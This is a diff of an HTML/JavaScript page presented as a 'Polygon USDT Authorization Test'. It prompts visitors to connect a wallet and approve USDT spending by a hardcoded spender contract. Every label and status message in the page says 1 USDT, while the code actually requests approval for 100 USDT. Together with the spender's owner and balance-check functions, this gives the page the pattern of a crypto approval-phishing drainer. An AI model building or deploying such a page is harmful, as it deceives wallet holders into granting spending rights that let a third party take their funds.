@@ -2,118 +2,185 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<title>USDT Authorization TesT</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+
+<title>Polygon USDT Test</title>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
 </head>
 
 <body>
 
-<h3>USDT Authorization Test</h3>
+<h3>Polygon USDT Authorization Test</h3>
 
 <p id="status">Checking wallet...</p>
 
-<button id="approve">
-    Authorize 10 USDT
+<button id="approveBtn">
+    Authorize 1 USDT
 </button>
+
+<br><br>
+
+<button id="checkBtn">
+    Check Allowance / Balance
+</button>
+
+<br><br>
+
+<div id="details"></div>
 
 <script>
 
-const NETWORKS = {
+const POLYGON_CHAIN_ID = 137;
 
-    1: {
-        name: "Ethereum",
-        token: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-        decimals: 6,
-        spender: "0xa7C380414bAA310898f444e21F7364b43Ae2591A"
-    },
+const USDT =
+    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
 
-    137: {
-        name: "Polygon",
-        token: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
-        decimals: 6,
-        spender: "0xa7C380414bAA310898f444e21F7364b43Ae2591A"
-    },
+// IMPORTANT:
+// Put the actual Polygon USDTSpender deployment here.
+const SPENDER =
+    "0x1EDF7236Bf235caC8A09b1c61B53a19069A704A5";
 
-    43114: {
-        name: "Avalanche",
-        token: "0x9702230A8Ea53601f5cD2dc00fDBC13d4dF4A8c7",
-        decimals: 6,
-        spender: "0xa7C380414bAA310898f444e21F7364b43Ae2591A"
-    }
+const AMOUNT =
+    ethers.parseUnits("100", 6);
 
-};
 
-const ABI = [
- "function approve(address,uint256)",
- "function allowance(address,address) view returns(uint256)"
+const USDT_ABI = [
+
+    "function approve(address spender,uint256 amount) returns(bool)",
+
+    "function allowance(address owner,address spender) view returns(uint256)",
+
+    "function balanceOf(address owner) view returns(uint256)"
 ];
+
+
+const SPENDER_ABI = [
+
+    "function owner() view returns(address)",
+
+    "function token() view returns(address)",
+
+    "function checkAllowance(address user) view returns(uint256)",
+
+    "function checkBalance(address user) view returns(uint256)"
+
+];
+
+
+const statusEl =
+    document.getElementById("status");
+
+const detailsEl =
+    document.getElementById("details");
+
+const approveBtn =
+    document.getElementById("approveBtn");
+
+const checkBtn =
+    document.getElementById("checkBtn");
+
 
 let provider;
 let signer;
 let user;
 
 
+/* -----------------------------
+   Initialize wallet
+----------------------------- */
+
 async function init() {
 
-    if (!window.ethereum) {
-        status.innerText = "EVM wallet not detected";
-        return;
-    }
+    try {
 
-    provider =
-        new ethers.BrowserProvider(window.ethereum);
+        if (!window.ethereum) {
 
-    let accounts =
-        await provider.send("eth_accounts", []);
+            statusEl.innerText =
+                "Open this page inside Trust Wallet, MetaMask or another EVM wallet.";
 
-    if (accounts.length) {
+            return;
+        }
 
-        user = accounts[0];
 
-        signer =
-            await provider.getSigner();
+        provider =
+            new ethers.BrowserProvider(
+                window.ethereum
+            );
 
-        showNetwork();
 
-    } else {
+        const accounts =
+            await provider.send(
+                "eth_accounts",
+                []
+            );
 
-        status.innerText =
-            "Wallet detected — authorization required";
 
+        const network =
+            await provider.getNetwork();
+
+
+        const chainId =
+            Number(network.chainId);
+
+
+        if (chainId !== POLYGON_CHAIN_ID) {
+
+            statusEl.innerText =
+                `Wrong network. Current chain ID: ${chainId}. Switch to Polygon.`;
+
+            return;
+        }
+
+
+        if (accounts.length > 0) {
+
+            user = accounts[0];
+
+            signer =
+                await provider.getSigner();
+
+            statusEl.innerText =
+                `Connected: ${user} | Polygon`;
+
+        } else {
+
+            statusEl.innerText =
+                "Polygon wallet detected — tap Authorize 1 USDT.";
+
+        }
+
+    } catch(error) {
+
+        console.error(error);
+
+        statusEl.innerText =
+            error.message;
     }
 }
 
 
-async function showNetwork() {
-
-    const network =
-        await provider.getNetwork();
-
-    const id =
-        Number(network.chainId);
-
-    const config =
-        NETWORKS[id];
-
-    if (!config) {
-
-        status.innerText =
-            `Unsupported EVM network (${id})`;
-
-        return;
-    }
-
-    status.innerText =
-        `${config.name} | ${user}`;
-}
-
+/* -----------------------------
+   Request wallet account
+----------------------------- */
 
 async function getSigner() {
 
+    if (!provider) {
+
+        provider =
+            new ethers.BrowserProvider(
+                window.ethereum
+            );
+    }
+
+
     let accounts =
-        await provider.send("eth_accounts", []);
+        await provider.send(
+            "eth_accounts",
+            []
+        );
+
 
     if (!accounts.length) {
 
@@ -122,77 +189,213 @@ async function getSigner() {
                 "eth_requestAccounts",
                 []
             );
-
     }
 
-    user = accounts[0];
+
+    user =
+        accounts[0];
+
 
     signer =
         await provider.getSigner();
+
+
+    const network =
+        await provider.getNetwork();
+
+
+    if (
+        Number(network.chainId)
+        !== POLYGON_CHAIN_ID
+    ) {
+
+        throw new Error(
+            "Please switch wallet to Polygon."
+        );
+    }
+
+
+    return signer;
 }
 
 
-approve.onclick = async () => {
+/* -----------------------------
+   Approve exactly 1 USDT
+----------------------------- */
+
+approveBtn.onclick =
+async () => {
+
+    approveBtn.disabled = true;
 
     try {
 
-        if (!provider)
-            throw Error("Wallet unavailable");
-
         await getSigner();
 
-        const network =
-            await provider.getNetwork();
-
-        const chainId =
-            Number(network.chainId);
-
-        const config =
-            NETWORKS[chainId];
-
-        if (!config)
-            throw Error("Unsupported network");
 
         if (
-            !ethers.isAddress(config.spender)
-        )
-            throw Error(
-                `Spender not configured for ${config.name}`
-            );
+            !ethers.isAddress(SPENDER)
+        ) {
 
-        const token =
+            throw new Error(
+                "Invalid spender contract address."
+            );
+        }
+
+
+        const usdt =
             new ethers.Contract(
-                config.token,
-                ABI,
+                USDT,
+                USDT_ABI,
                 signer
             );
 
-        const amount =
-            ethers.parseUnits(
-                "10",
-                config.decimals
+
+        const previousAllowance =
+            await usdt.allowance(
+                user,
+                SPENDER
             );
+
+
+        if (
+            previousAllowance >= AMOUNT
+        ) {
+
+            statusEl.innerText =
+                "This wallet already authorized at least 1 USDT.";
+
+            return;
+        }
+
+
+        statusEl.innerText =
+            "Confirm the 1 USDT approval in your wallet...";
+
 
         const tx =
-            await token.approve(
-                config.spender,
-                amount
+            await usdt.approve(
+                SPENDER,
+                AMOUNT
             );
 
-        status.innerText =
-            "Waiting for confirmation...";
 
-        await tx.wait();
+        statusEl.innerText =
+            `Approval submitted: ${tx.hash}`;
 
-        status.innerText =
-            `1 USDT authorized on ${config.name}`;
 
-    } catch(e) {
+        const receipt =
+            await tx.wait();
 
-        console.error(e);
 
-        status.innerText =
-            e.shortMessage || e.message;
+        statusEl.innerText =
+            `✓ 1 USDT authorized on Polygon. TX: ${receipt.hash}`;
+
+
+        await checkState();
+
+    }
+
+    catch(error) {
+
+        console.error(error);
+
+        statusEl.innerText =
+            error.shortMessage ||
+            error.message;
+    }
+
+    finally {
+
+        approveBtn.disabled = false;
+    }
+};
+
+
+/* -----------------------------
+   Check balance + allowance
+----------------------------- */
+
+async function checkState() {
+
+    await getSigner();
+
+
+    const usdt =
+        new ethers.Contract(
+            USDT,
+            USDT_ABI,
+            provider
+        );
+
+
+    const spender =
+        new ethers.Contract(
+            SPENDER,
+            SPENDER_ABI,
+            provider
+        );
+
+
+    const balance =
+        await usdt.balanceOf(user);
+
+
+    const allowance =
+        await usdt.allowance(
+            user,
+            SPENDER
+        );
+
+
+    const contractOwner =
+        await spender.owner();
+
+
+    detailsEl.innerHTML = `
+
+        <p>
+        Wallet:
+        ${user}
+        </p>
+
+        <p>
+        USDT balance:
+        ${ethers.formatUnits(balance,6)}
+        </p>
+
+        <p>
+        Spender allowance:
+        ${ethers.formatUnits(allowance,6)} USDT
+        </p>
+
+        <p>
+        Spender contract:
+        ${SPENDER}
+        </p>
+
+        <p>
+        Contract owner:
+        ${contractOwner}
+        </p>
+    `;
+}
+
+
+checkBtn.onclick =
+async () => {
+
+    try {
+
+        await checkState();
+
+    } catch(error) {
+
+        console.error(error);
+
+        statusEl.innerText =
+            error.shortMessage ||
+            error.message;
     }
 };
 
@@ -202,13 +405,16 @@ window.ethereum?.on(
     () => location.reload()
 );
 
+
 window.ethereum?.on(
     "accountsChanged",
     () => location.reload()
 );
 
+
 init();
 
 </script>
+
 </body>
 </html>
